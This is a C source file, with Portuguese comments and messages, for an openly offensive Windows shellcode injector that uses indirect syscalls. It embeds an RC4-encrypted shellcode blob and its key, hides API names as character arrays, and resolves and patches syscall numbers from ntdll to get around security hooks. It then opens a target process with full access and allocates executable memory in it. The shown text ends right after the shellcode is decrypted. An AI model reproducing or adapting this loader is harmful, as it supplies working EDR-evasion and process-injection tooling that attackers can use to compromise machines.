#include"func.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
	);

BOOL RC4DEC(PBYTE pRc4Key, PBYTE pPayloadData, DWORD dwRc4KeySize, DWORD sPayloadSize) {
	NTSTATUS status = NULL;

	USTRING Key = { .Buffer = pRc4Key, .Length = dwRc4KeySize, .MaximumLength = dwRc4KeySize };
	USTRING Img = { .Buffer = pPayloadData, .Length = sPayloadSize, .MaximumLength = sPayloadSize };

	char a_dll_name[] = { 'A','d','v','a','p','i','3','2','.','d','l','l',0 };
	HMODULE hAdvapi = LoadLibraryA(a_dll_name);
	if (!hAdvapi) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "Falha ao carregar a biblioteca Advapi32\n");
		return FALSE;
	}

	char NotSysFunc32[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','2',0 };
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(hAdvapi, NotSysFunc32);
	if (!SystemFunction032) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "Falha ao obter o endere�o de SystemFunction032\n");
		FreeLibrary(hAdvapi);
		return FALSE;
	}

	status = SystemFunction032(&Img, &Key);
	FreeLibrary(hAdvapi);
	return NT_SUCCESS(status);
}

DWORD GetProcessIdByName(const wchar_t* processName)
{
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(snapshot, &processEntry))
		{
			do
			{
				if (wcscmp(processEntry.szExeFile, processName) == 0)
				{
					CloseHandle(snapshot);
					return processEntry.th32ProcessID;
				}
			} while (Process32NextW(snapshot, &processEntry));
		}
	}

	CloseHandle(snapshot);
	return 0;
}

char n_dll_name[] = { 'n','t','d','l','l','.','d','l','l',0 };
unsigned char calcularSSN(void* funcPointer) {
	return ((unsigned char*)funcPointer)[4];
}

// Isso era pra funcionar melhor :/
void obterSSNeEndereco(const char* funcName, const char* funcAlias, DWORD* ssn, UINT_PTR* addr) {
	UINT_PTR funcPointer = (UINT_PTR)GetProcAddress(GetModuleHandleA(n_dll_name), funcAlias);

	if (funcPointer == 0) {
		SetConsoleColor(12);
		fprintf(stderr, "\nErro: Nao foi possivel encontrar o endere�o de %s\n", funcName);
		return;
	}

	unsigned char ssnAtual = calcularSSN((void*)funcPointer);
	unsigned char ssnCorreto = ssnAtual;

	char NotNtAllocateVirtualMemoryName[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
	char NotNtWriteVirtualMemoryName[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
	char NotNtCreateThreadExName[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', 0 };
	char NotZwQueryValueKeyName[] = { 'Z', 'w', 'Q', 'u', 'e', 'r', 'y', 'V', 'a', 'l', 'u', 'e', 'K', 'e', 'y', 0 };
	char NotNtCloseObjectAuditAlarmName[] = { 'N', 't', 'C', 'l', 'o', 's', 'e', 'O', 'b', 'j', 'e', 'c', 't', 'A', 'u', 'd', 'i', 't', 'A', 'l', 'a', 'r', 'm', 0 };
	char NotZwCreateSymbolicLinkObjectName[] = { 'Z', 'w', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'y', 'm', 'b', 'o', 'l', 'i', 'c', 'L', 'i', 'n', 'k', 'O', 'b', 'j', 'e', 'c', 't', 0 };

	if (strcmp(funcAlias, NotNtAllocateVirtualMemoryName) == 0) {
		ssnCorreto = calcularSSN((void*)GetProcAddress(GetModuleHandleA(n_dll_name), NotZwQueryValueKeyName)) + 1;
	}
	else if (strcmp(funcAlias, NotNtWriteVirtualMemoryName) == 0) {
		ssnCorreto = calcularSSN((void*)GetProcAddress(GetModuleHandleA(n_dll_name), NotNtCloseObjectAuditAlarmName)) - 1;
	}
	else if (strcmp(funcAlias, NotNtCreateThreadExName) == 0) {
		ssnCorreto = calcularSSN((void*)GetProcAddress(GetModuleHandleA(n_dll_name), NotZwCreateSymbolicLinkObjectName)) + 1;
	}

	*ssn = ssnCorreto;
	*addr = funcPointer;

	SetConsoleColor(10);
	printf("%s SSN Atual: ", funcName);
	SetConsoleColor(15);
	printf("0x%02X, ", ssnAtual);
	SetConsoleColor(9);
	printf("SSN Correto: ");
	SetConsoleColor(15);
	printf("0x%02X\n", ssnCorreto);
}

int main() {
	// Shellcode gerada com o projeto https://github.com/hasherezade/masm_shc/
	unsigned char shellcode[] = {
		0x53, 0x01, 0xE6, 0xCA, 0xBB, 0x01, 0xAC, 0xB0,
	0x70, 0x4D, 0xDF, 0x18, 0xBD, 0x00, 0xEA, 0x92,
		0x2D, 0xAB, 0x15, 0x94, 0xB2, 0xEF, 0x31, 0xF6,
	0x80, 0x5A, 0xE1, 0x26, 0x3D, 0xC6, 0xD1, 0xF3,
		0xAF, 0xB6, 0x2D, 0x2A, 0x7F, 0xD2, 0x34, 0x42,
	0x2A, 0x3D, 0x10, 0xB7, 0x6E, 0x53, 0x8E, 0x15,
		0x3C, 0x6F, 0x75, 0x16, 0x8F, 0xC0, 0x27, 0x1B,
	0xC8, 0xCD, 0x72, 0x62, 0xF1, 0x7E, 0xCD, 0x55,
		0xD7, 0x0E, 0xB3, 0x0A, 0x6F, 0x18, 0xA7, 0x5E,
	0x44, 0x40, 0xEB, 0x22, 0xA8, 0xBC, 0xE2, 0x79,
		0xC9, 0x58, 0xBF, 0xF2, 0xF3, 0xF1, 0xA0, 0xF4,
	0x68, 0x09, 0x98, 0xBA, 0x65, 0xDB, 0xA9, 0x1C,
		0x28, 0x16, 0x30, 0x12, 0xAE, 0xB8, 0xCF, 0x23,
	0xB0, 0x3C, 0xD6, 0x85, 0xD5, 0x57, 0x6A, 0x52,
		0x95, 0x90, 0x9A, 0xEE, 0x74, 0xB3, 0xC2, 0xA9,
	0x45, 0x3F, 0x8D, 0xC0, 0x0F, 0xAB, 0x2C, 0x4D,
		0xA1, 0x15, 0x12, 0x11, 0xFC, 0xCF, 0x59, 0x5B,
	0x5F, 0x3E, 0x2E, 0x77, 0x67, 0x90, 0xA4, 0x47,
		0x27, 0xBA, 0x01, 0x2C, 0x0D, 0x5F, 0x34, 0x58,
	0xD1, 0x9B, 0x71, 0xD8, 0x6C, 0x55, 0x66, 0x06,
		0xA9, 0x55, 0x3C, 0xE6, 0xFA, 0xB4, 0x4C, 0xBC,
	0xFC, 0x8B, 0x6A, 0x66, 0x46, 0xE0, 0x35, 0x6D,
		0x40, 0xD5, 0xA8, 0xC1, 0xD3, 0x2A, 0x00, 0x38,
	0x25, 0x45, 0x25, 0xD5, 0xEE, 0xD4, 0xAD, 0xA3,
		0x92, 0xAC, 0xC6, 0x9E, 0x7A, 0x51, 0x05, 0x6D,
	0x08, 0x38, 0xF4, 0x46, 0x13, 0x7A, 0x31, 0x5E,
		0xF4, 0x5C, 0x70, 0xBF, 0xDB, 0x2D, 0xC0, 0x7A,
	0xE1, 0x78, 0xB6, 0xF6, 0xB4, 0xD0, 0xBF, 0xDA,
		0xDA, 0x25, 0xF3, 0x0B, 0x80, 0x73, 0x11, 0x16,
	0xDC, 0x88, 0x69, 0xDF, 0xE5, 0x41, 0x67, 0x70,
		0x1E, 0x37, 0x71, 0x83, 0xE7, 0xF2, 0x9B, 0x61,
	0x18, 0x8B, 0xA1, 0xD6, 0x64, 0x52, 0xCF, 0x90,
		0xC2, 0x05, 0xFD, 0xBC, 0xB1, 0x54, 0xDA, 0xE6,
	0xF1, 0x94, 0x2A, 0x00, 0xCF, 0x44, 0xDB, 0xE2,
		0xE3, 0xE9, 0xF1, 0xD7, 0x9A, 0x0B, 0x72, 0x9A,
	0xF0, 0x54, 0x71, 0xA6, 0x85, 0xB1, 0x93, 0x5F,
		0xDC, 0xE1, 0x51, 0x27, 0xB7, 0x8D, 0x7F, 0x54,
	0x6C, 0x63, 0xEA, 0x2F, 0xED, 0xE9, 0x76, 0x86,
		0x06, 0x22, 0xD8, 0x06, 0xE1, 0xFD, 0xD1, 0xB6,
	0x0C, 0x6D, 0xC6, 0x9F, 0xA6, 0x22, 0xB0, 0x42,
		0xE3, 0xF3, 0x1E, 0xDA, 0xEC, 0x92, 0x06, 0x5E,
	0xFF, 0xED, 0xC3, 0xBA, 0xBE, 0xF3, 0xA7, 0x69,
		0x2D, 0xCB, 0x45, 0x12, 0xC2, 0xF7, 0xBA, 0x42,
	0x5E, 0x59, 0xFC, 0x43, 0x6E, 0x96, 0xFA, 0x77,
		0x99, 0x4E, 0xEB, 0xF8, 0x6D, 0xD1, 0x90, 0x96,
	0xF5, 0xF5, 0x75, 0x3C, 0x52, 0xB8, 0x55, 0x4C,
		0x8E, 0xE0, 0x7D, 0xAA, 0xC8, 0x54, 0x74, 0xCD,
	0x6D, 0x68, 0x1D, 0x5C, 0xF3, 0x54, 0x4B, 0x2B,
		0x20, 0x94, 0xB4, 0x51, 0xF7, 0x98, 0x3F, 0x2C,
	0xC3, 0xF8, 0x6C, 0x87, 0x04, 0xD1, 0x4B, 0xAD,
		0xB3, 0xC5, 0x79, 0x60, 0xDC, 0x95, 0xFE, 0x89,
	0x25, 0x15, 0x69, 0x2A, 0x4D, 0x70, 0xAE, 0x39,
		0xAE, 0x1D, 0x53, 0xF1, 0x6D, 0x2A, 0xF5, 0x3F,
	0x33, 0x72, 0xB2, 0x84, 0x14, 0x6A, 0xC5, 0xEF,
		0x52, 0x55, 0x1E, 0x12, 0x8A, 0x60, 0xAE, 0xD5,
	0xEA, 0x07, 0x70, 0x4B, 0x59, 0xA5, 0xA0, 0x31,
		0xB9, 0xDB, 0x3D, 0x4D, 0xB9, 0x0D, 0x3B, 0x52,
	0x58, 0x0E, 0x95, 0xDE, 0x33, 0x88, 0xF5, 0xDB,
		0xE7, 0x70, 0xFA, 0xB2, 0xA7, 0x75, 0xCC, 0xA9,
	0xF8, 0x12, 0x7A, 0xFA, 0xD6, 0x17, 0x20, 0x74,
		0x0C, 0xF8, 0x9C, 0x2F, 0x5A, 0x95, 0xEA, 0xE8,
	0xBB, 0x29, 0x39, 0x1B, 0xE5, 0xB6, 0xA6, 0x20,
		0x62, 0x3C, 0x8E, 0xED, 0xC3, 0xC7, 0xCA, 0xC0,
	0x10, 0xC7, 0xAC, 0x54, 0xE0, 0xA6, 0x5A, 0x9E,
		0x25, 0x6B, 0x59, 0xD3, 0x2F, 0xC7, 0x05, 0x6A,
	0x6A, 0xE6, 0x7E, 0xA4, 0x88, 0x12, 0xCA, 0xE4,
		0xDD, 0x94, 0xAA, 0xB3, 0x9D, 0x85, 0xE5, 0x24,
	0xE1, 0xA8, 0xE2, 0x75, 0xE2, 0xBF, 0x46, 0x25,
		0x4F, 0xA8, 0x78, 0xD0, 0x5D, 0x96, 0x5D, 0x84,
	0x8E, 0x81, 0x62, 0xDE, 0x36, 0xA7, 0xD5, 0x37,
		0x23, 0x45, 0x60, 0x48, 0xA7, 0x14, 0x6A, 0x63,
	0x62, 0x26, 0x16, 0xD0, 0x93, 0x0B, 0x6D, 0x5A,
		0xF4, 0x2C, 0xB8, 0xB2, 0x25, 0x1C, 0xBE, 0x42,
	0xCA, 0xAC, 0xB9, 0xAD, 0xF9, 0x90, 0xD5, 0xF8,
		0x34, 0x8F, 0xAB, 0x8C, 0x41, 0x05, 0x3D, 0x77,
	0xB9, 0x9C, 0xA4, 0x08, 0xC0, 0x3D, 0x58, 0xF3,
		0x81, 0xFD, 0x4C, 0x12, 0x20, 0x04, 0x93, 0x2A,
	0xFB, 0x9A, 0x71, 0x19, 0xAB, 0xF4, 0x85, 0x94,
		0x4F, 0x5A, 0x16, 0xD6, 0xAC, 0xF3, 0x42, 0x62,
	0x5A, 0xCF, 0x0C, 0xB5, 0x5B, 0xC8, 0x6E, 0xB2,
		0xF1, 0xDE, 0x8B, 0x4F, 0x24, 0xFA, 0xDE, 0x7F,
	0xFE, 0xB7, 0x51, 0x8B, 0x8A, 0x8B, 0xE5, 0x92,
		0xEE, 0x4B, 0x08, 0xCC, 0xC3, 0x32, 0x4F, 0xA2,
	0x70, 0x69, 0x10, 0x44, 0xB1, 0xC1, 0x53, 0xFE,
		0x4A, 0xB1, 0xD9, 0x15, 0x2B, 0xD6, 0xF2, 0xE5,
	0x31, 0x66, 0x2F, 0xB7, 0x85, 0x57, 0x88, 0xA2,
		0xBF, 0x79, 0x3B, 0xC3, 0xE6, 0x18, 0x54, 0xE4,
	0x00, 0xDA, 0x9A, 0xC3, 0xDB, 0xD8, 0x4C, 0x39,
		0x45, 0x53, 0x9F, 0x24, 0x0B, 0x6C, 0x64, 0x5E,
	0x69, 0xD8, 0xF6, 0x1D, 0xCA, 0x60, 0x9C, 0x4C,
		0x58, 0xDC, 0xAA, 0xBA, 0xE0, 0x70, 0x08, 0x69,
	0xC6, 0x63, 0xB1, 0xBE, 0x24, 0xDF, 0xED, 0x9D,
		0x4A, 0x84, 0x53, 0x78, 0x58, 0x42, 0x4C, 0xC8,
	0xF8, 0x19, 0x3B, 0x03, 0xC6, 0x05, 0x3A, 0x54,
		0x37, 0x84, 0x99, 0x7D, 0x27, 0x66, 0x22, 0x57,
	0x21, 0xBB, 0x14, 0x96, 0xB0, 0x14, 0xC5, 0xBD,
		0x96, 0x9D, 0x40, 0xE8, 0xC4, 0xF5, 0x9A, 0x84,
	0x3A, 0xF9, 0x97, 0x56, 0x6C, 0xC7, 0xFE, 0x31,
		0xDD, 0xBD, 0x7D, 0x26, 0xB7, 0x16, 0xCA, 0x61,
	0x5A, 0x63, 0x81, 0xA5, 0x43, 0x2D, 0x03, 0x02,
		0x00, 0xCD, 0x77, 0xCC, 0x34, 0x67, 0x14, 0xC7,
	0x99, 0x7F, 0x21, 0xFA, 0x0F, 0xBD, 0x38, 0xDB,
		0x0B, 0x66, 0xC5, 0xEA, 0x2C, 0xF0, 0x5B, 0x14,
	0x90, 0xE2, 0x7D, 0x57, 0x77, 0x2F, 0x1A, 0x20,
		0xE4, 0xB6, 0xDF, 0xE8, 0x91, 0xC8, 0x00, 0x0E,
	0x90, 0x34, 0x28, 0xE2, 0x80, 0x26, 0xD2, 0x87,
		0x74, 0x63, 0x3F, 0xD0, 0xB7, 0x0F, 0xFE, 0x12,
	0xB2, 0x22, 0x86, 0xA2, 0x9B, 0x0C, 0x41, 0x25,
		0x1D, 0xDB, 0x0D, 0xEB, 0x68, 0xFF, 0x94, 0xD1,
	0x31, 0xC2, 0x20, 0x30, 0x46, 0x15, 0x1E, 0xE9,
		0xF7, 0xC7, 0x80, 0x12, 0x00, 0x6C, 0x7B, 0x76,
	0x3E, 0x31, 0xDC, 0x67, 0x16, 0xDC, 0xE2, 0xC5,
		0x58, 0xF8, 0x99, 0x5D, 0x43, 0x81, 0x28, 0x2A,
	0xEC, 0xD7, 0x81, 0x90, 0xFB, 0x16, 0x9E, 0x10,
		0xC1, 0x05, 0xC8, 0xBE, 0x2C, 0x4E, 0xCF, 0x51,
	0x2B, 0x07, 0xC4, 0x90, 0xBE, 0xD4, 0xB8, 0x43,
		0x1E, 0x4F, 0x42, 0xC7, 0x3D, 0x45, 0xEC, 0x32,
	0xEE, 0xE9, 0x75, 0x49, 0x59, 0x44, 0x70, 0x2E,
		0x07, 0x55, 0x0C, 0xC5, 0xFC, 0xF9, 0xBF, 0x89,
	0x95, 0x1B, 0x9B, 0x9B, 0x6D, 0x8B, 0xA1, 0x98,
		0x46, 0x58, 0x1A, 0xC2, 0xAE, 0xD8, 0x6F, 0x96,
	0xCD, 0xEE, 0xC8, 0x12, 0xC4, 0x84, 0xDD, 0x1C,
		0x1D, 0x8D, 0xE8, 0xCB, 0x8D, 0x3F, 0x1A, 0x9E,
	0x6D, 0x1A, 0x6C, 0xC7, 0x41, 0x8D, 0x56, 0x47,
		0x32, 0xD9, 0x4C, 0x48, 0xE6, 0x45, 0x93, 0x58,
	0x0F, 0x2A, 0x59, 0x47, 0xD9, 0xCE, 0x60, 0xE7,
		0x57, 0xEC, 0x67, 0xB7, 0x6C, 0x21, 0x93, 0x52,
	0xBC, 0x73, 0xA0, 0x71, 0xB7, 0x5E, 0x6C, 0xB9,
		0xE1, 0xEA, 0xE8, 0x49, 0xBB, 0xDC, 0x19, 0xFE,
	0xC1, 0xCA, 0xED, 0x4F, 0xF7, 0x4E, 0xA7, 0xF4,
		0x67, 0x78, 0xF0, 0x41, 0xF4, 0xE1, 0x92, 0xB7,
	0x58, 0x65, 0x23, 0xBC, 0x50, 0x9F, 0x47, 0x62,
		0xB6, 0x16, 0x4A, 0x17, 0x19, 0x7F, 0xCE, 0x37,
	0x18, 0x91, 0x11, 0x3E, 0xB8, 0x01, 0x10, 0xAF,
		0xB8, 0xE2, 0x62, 0xA5, 0x6A, 0x83, 0x8E, 0x1C,
	0xE8, 0x03, 0x79, 0x2C, 0x29, 0x7D, 0xDB, 0xDB,
		0x8B, 0x01, 0xFD, 0x54, 0x27, 0xDD, 0x9D, 0x38,
	0xDE, 0x87, 0x6B, 0x53, 0xBA, 0x1E, 0xF8, 0xF5,
		0x21, 0xDE, 0x31, 0xA4, 0x7C, 0x86, 0x23, 0x7F,
	0xEF, 0x31, 0x63, 0x7F, 0x0A, 0x98, 0x03, 0x76,
		0xF2, 0x5B, 0x15, 0x8A, 0xBF, 0x1B, 0x12, 0xEC,
	0xCB, 0xD5, 0xAD, 0xF8, 0xF4, 0x99, 0xC8, 0x2E,
		0x2A, 0xA2, 0xA5, 0x89, 0x43, 0xAB, 0x37, 0x1F,
	0xCF, 0x3F, 0x33, 0xC6, 0x72, 0xE8, 0x5F, 0x80,
		0x05, 0x7E, 0xBB, 0x2E, 0xDA, 0x77, 0x22, 0x08,
	0xC4, 0x67, 0x3F, 0xE6, 0x97, 0xAF, 0x3B, 0x8C,
		0xDD, 0xC4, 0x9C, 0xD7, 0x0F, 0x13, 0xFA, 0x85,
	0x65, 0x57, 0x06, 0xE4, 0x5E, 0x4A, 0x37, 0xC0,
		0xDF, 0xC2, 0xF1, 0xB0, 0x03, 0x26, 0xEF, 0xCD,
	0x7D, 0x50, 0xD9, 0x40, 0xF1, 0xF6, 0x0F, 0x52,
		0xC7, 0x89, 0xE1, 0xEA, 0xDF, 0x5D, 0xFB, 0x43,
	0x06, 0xB5, 0xC8, 0xC4, 0x49, 0xFE, 0xE4, 0xB1,
		0x43, 0x73, 0x4A, 0x1F, 0x03, 0x0D, 0xC4, 0x4F,
	0xD9, 0xC9, 0xC0, 0x62, 0x6D, 0x22, 0xEE, 0xCC,
		0x24, 0x5C, 0x0A, 0x36, 0x56, 0x16, 0xA6, 0x10,
	0x3B, 0x21, 0x5F, 0xC3, 0xAB, 0x7F, 0x6B, 0x42,
		0x5B, 0x15, 0xB8, 0x45, 0x6A, 0x07, 0xA7, 0x3E,
	0xD1, 0xAA, 0x55, 0x84, 0xF9, 0xC4, 0xA4, 0x9A,
		0xA1, 0xCA, 0xD4, 0x02, 0x7C, 0xAA, 0x8A, 0x78,
	0x3B, 0x39, 0xF0, 0xEF, 0x5A, 0xF8, 0x8C, 0x7D,
		0xD8, 0xF5, 0x0D, 0xFD, 0x83, 0xF1, 0x37, 0xF6,
	0x93, 0x61, 0x52, 0xE8, 0xBB, 0xD7, 0xF9, 0x73,
		0x6B, 0x7E, 0xDF, 0x92, 0x5C, 0xAF, 0x62, 0xB5,
	0xCB, 0xFD, 0xB2, 0x4B, 0x18, 0x0C, 0x8B, 0xE3,
		0xC5, 0xE8, 0xDF, 0x9A, 0xA9, 0x91, 0x59, 0x97,
	0x3A, 0xE6, 0x50, 0x8E, 0x35, 0xC8, 0xDF, 0x74,
		0xC6, 0x0B, 0x9B, 0x9D, 0xF0, 0x48, 0x54, 0xC8,
	0xD1, 0xA3, 0x27, 0x2F, 0x90, 0xF0, 0xE3, 0xCA,
		0x1F, 0xEE, 0x30, 0xAF, 0xE6, 0x91, 0x91, 0x66,
	0xB9, 0x63, 0xA8, 0x25, 0xE1, 0xB0, 0x61, 0x8F,
		0x70, 0x6C, 0x9E, 0xC7, 0x67, 0x35, 0x4D, 0x58,
	0x42, 0xB4, 0x20, 0x1B, 0x31, 0x04, 0x43, 0x5A,
		0x98, 0x9B, 0x31, 0xC7, 0x8D, 0x74, 0xE8, 0x84,
	0x31, 0xCD, 0x0F, 0x21, 0x46, 0xC5, 0x27, 0x84,
		0xD7, 0xD7, 0x3A, 0x9C, 0xBA, 0xEF, 0x57, 0x77,
	0x76, 0x35, 0xC3, 0xB1, 0x61, 0x20, 0xED, 0xA3,
		0xD0, 0x84, 0xA3, 0x3C, 0x87, 0xA4, 0x0F, 0x59,
	0x00, 0x18, 0xC0, 0x25, 0xA7, 0xA1, 0xEA, 0x4C,
		0xDC, 0x9D, 0xF3, 0xF2, 0x09, 0x27, 0xE7, 0x25,
	0xCE, 0xC1, 0x62, 0x13, 0xC5, 0x62, 0x40, 0xA1,
		0x50, 0x4A, 0x5E, 0x29, 0xA9, 0x35, 0x5E, 0x3F,
	0x16, 0x52, 0xBA, 0x89, 0x44, 0xEC, 0x25, 0x85,
		0x60, 0xD2, 0x90, 0xBF, 0x40, 0x35, 0xD7, 0xD4,
	0xD7, 0xB5, 0xD2, 0x30, 0x9B, 0x73, 0x94, 0xC9,
		0xEF, 0xD3, 0x0D, 0xA8, 0x1D, 0xB3, 0x35, 0x91,
	0xE1, 0x33, 0xA3, 0x2C, 0x76, 0xA1, 0xF7, 0x65,
		0x89, 0x58, 0x86, 0xE8, 0xD1, 0x29, 0xD6, 0x70,
	0x86, 0xE1, 0x1A, 0x38, 0xC3, 0x33, 0x90, 0x5E,
		0xB9, 0x79, 0x2C, 0xA3, 0x79, 0xBE, 0x2C, 0x99,
	0x2B, 0x3C, 0xDD, 0x94, 0xEE, 0x17, 0x0E, 0x17,
		0xF1, 0x8C, 0xAF, 0x06, 0x04, 0x2E, 0x50, 0xA0,
	0xD6, 0x9A, 0x8F, 0xC8, 0x60, 0x41, 0x3D, 0x6A,

	};

	unsigned char Key[] = {
		0x61, 0x63, 0xF5, 0xC1, 0x86, 0xA9, 0xBB, 0xFE,
		0x5D, 0x97, 0x3E, 0x9A, 0xB1, 0x57, 0xF3, 0x8E,
	};

	DWORD SizeKey = sizeof(Key);
	DWORD shellcodeSize = sizeof(shellcode);
	SIZE_T regionSize = shellcodeSize;
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	PVOID allocBuffer = NULL;

	char NotNtAllocateVirtualMemoryName[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
	char NotNtOpenProcessName[] = { 'N', 't', 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
	char NotNtWriteVirtualMemoryName[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
	char NotNtCreateThreadExName[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', 0 };
	char NotNtWaitForSingleObjectName[] = { 'N', 't', 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };

	SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
	printf(
		" _______           __ __                   __        _______                          __ __	        \n"
		"|_     _|.-----.--|  |__|.----.-----.----.|  |_     |     __|.--.--.-----.----.---.-.|  |  |.-----.	\n"
		" _|   |_ |     |  _  |  ||   _|  -__|  __||   _|    |__     ||  |  |__ --|  __|  _  ||  |  ||__ --|    \n"
		"|_______||__|__|_____|__||__| |_____|____||____|    |_______||___  |_____|____|___._||__|__||_____|    \n"
		"                                                             |_____|								    \n"
	);

	obterSSNeEndereco(NotNtOpenProcessName, NotNtOpenProcessName, &SSNtOpenProcess, &AddrNtOpenProcess);
	obterSSNeEndereco(NotNtAllocateVirtualMemoryName, NotNtAllocateVirtualMemoryName, &SSNtAllocateVirtualMemory, &AddrNtAllocateVirtualMemory);
	obterSSNeEndereco(NotNtWriteVirtualMemoryName, NotNtWriteVirtualMemoryName, &SSNtWriteVirtualMemory, &AddrNtWriteVirtualMemory);
	obterSSNeEndereco(NotNtCreateThreadExName, NotNtCreateThreadExName, &SSNtCreateThreadEx, &AddrNtCreateThreadEx);
	obterSSNeEndereco(NotNtWaitForSingleObjectName, NotNtWaitForSingleObjectName, &SSNtWaitForSingleObject, &AddrNtWaitForSingleObject);

	SetConsoleColor(10);
	printf("SSN de NtOpenProcess: ");
	SetConsoleColor(15);
	printf("0x%02X, ", SSNtOpenProcess);
	SetConsoleColor(9);
	printf("Endereco Syscall: ");
	SetConsoleColor(15);
	printf("0x%016llX\n", AddrNtOpenProcess + 0x12);

	SetConsoleColor(10);
	printf("SSN de NtAllocateVirtualMemory: ");
	SetConsoleColor(15);
	printf("0x%02X, ", SSNtAllocateVirtualMemory);
	SetConsoleColor(9);
	printf("Endereco Syscall: ");
	SetConsoleColor(15);
	printf("0x%016llX\n", AddrNtAllocateVirtualMemory + 0x12);

	SetConsoleColor(10);
	printf("SSN de NtWriteVirtualMemory: ");
	SetConsoleColor(15);
	printf("0x%02X, ", SSNtWriteVirtualMemory);
	SetConsoleColor(9);
	printf("Endereco Syscall: ");
	SetConsoleColor(15);
	printf("0x%016llX\n", AddrNtWriteVirtualMemory + 0x12);

	SetConsoleColor(10);
	printf("SSN de NtCreateThreadEx: ");
	SetConsoleColor(15);
	printf("0x%02X, ", SSNtCreateThreadEx);
	SetConsoleColor(9);
	printf("Endereco Syscall: ");
	SetConsoleColor(15);
	printf("0x%016llX\n", AddrNtCreateThreadEx + 0x12);

	SetConsoleColor(10);
	printf("SSN de NtWaitForSingleObject: ");
	SetConsoleColor(15);
	printf("0x%02X, ", SSNtWaitForSingleObject);
	SetConsoleColor(9);
	printf("Endereco Syscall: ");
	SetConsoleColor(15);
	printf("0x%016llX\n", AddrNtWaitForSingleObject + 0x12);

	SSNtWriteVirtualMemory = SSNtWriteVirtualMemory;
	AddrNtWriteVirtualMemory = AddrNtWriteVirtualMemory + 0x12;
	SSNtOpenProcess = SSNtOpenProcess;
	AddrNtOpenProcess = AddrNtOpenProcess + 0x12;
	SSNtAllocateVirtualMemory = SSNtAllocateVirtualMemory;
	AddrNtAllocateVirtualMemory = AddrNtAllocateVirtualMemory + 0x12;
	SSNtCreateThreadEx = SSNtCreateThreadEx;
	AddrNtCreateThreadEx = AddrNtCreateThreadEx + 0x12;
	SSNtWaitForSingleObject = SSNtWaitForSingleObject;
	AddrNtWaitForSingleObject = AddrNtWaitForSingleObject + 0x12;

	const wchar_t* processName = L"Indirect-Syscalls.exe";
	DWORD pid = GetProcessIdByName(processName);

	HANDLE hProcess;
	CLIENT_ID clientId = { 0 };
	clientId.UniqueProcess = (HANDLE)pid;
	clientId.UniqueThread = NULL;

	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	printf("\n[*] Pressione Enter para abrir processo alvo");
	(void)getchar();
	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("[!] Abrindo Processo Alvo Com NtOpenProcess");

	NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
	if (!NT_SUCCESS(status)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nFalha ao abrir o processo de destino NTSTATUS: 0x%08X\n", status);
		return 1;
	}
	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	printf("\n[*] Pressione Enter para alocar memoria no processo alvo");
	(void)getchar();
	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("[!] Alocando Memoria Com NtAllocateVirtualMemory");

	NTSTATUS statusA = NtAllocateVirtualMemory(hProcess, &allocBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(statusA)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nErro: Falha ao alocar memoria virtual. NTSTATUS: 0x%08X\n", statusA);
		return 1;
	}

	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	printf("\n[*] Pressione Enter para descriptografar a shellcode");
	(void)getchar();

	// Noiz n�o abandona o rc4 :P
	BOOL DECRYPT = RC4DEC(Key, shellcode, SizeKey, shellcodeSize);
	if (!DECRYPT) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nErro ao descriptografar a shellcode\n");
		return 1;
	}

	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("[!] Shellcode descriptografada com sucesso");

